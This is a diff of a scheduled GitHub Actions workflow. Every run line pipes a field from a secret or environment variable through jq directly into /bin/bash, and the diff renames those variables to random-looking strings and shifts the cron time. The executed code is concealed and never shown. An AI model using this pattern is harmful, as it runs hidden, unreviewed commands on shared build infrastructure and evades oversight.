@@ -1,31 +1,20 @@
 name: qingrenhy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 0/6 * * *'
-jobs:  # 28492
+    - cron: '17 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qingrenhy
         env:
-          fox7: ${{ secrets.fox7 }}
+          i47771: ${{ secrets.i47771 }}
         run: |
-          echo $fox7 | jq -r .s72419 | /bin/bash
-          echo $jnxd961 | jq -r .wer075 | /bin/bash
-          echo $ui280 | jq -r .bnhna093 | /bin/bash
-          echo $eee39 | jq -r .tgw13 | /bin/bash
-          echo $zdgsd18816 | jq -r .z809 | /bin/bash
-          echo $mplr076 | jq -r .e32452 | /bin/bash
-          echo $fe6 | jq -r .t73 | /bin/bash
-          echo $jjztp41 | jq -r .wchz673 | /bin/bash
-          echo $cxzij28516 | jq -r .lhlr563 | /bin/bash
-          echo $zy59 | jq -r .ae5719 | /bin/bash
-          echo $oorng0 | jq -r .wo3452 | /bin/bash
-          echo $r67334 | jq -r .epi96789 | /bin/bash
-          echo $qwhfy8 | jq -r .e39 | /bin/bash
-          echo $hjx30 | jq -r .ny52 | /bin/bash
-          echo $oj624 | jq -r .jwku1864 | /bin/bash
+          echo $i47771 | jq -r .z178 | /bin/bash
+          echo $rq4558 | jq -r .ng13003 | /bin/bash
+          echo $tjo66 | jq -r .hgqd7 | /bin/bash
+          echo $ta7689 | jq -r .abzi18899 | /bin/bash
 
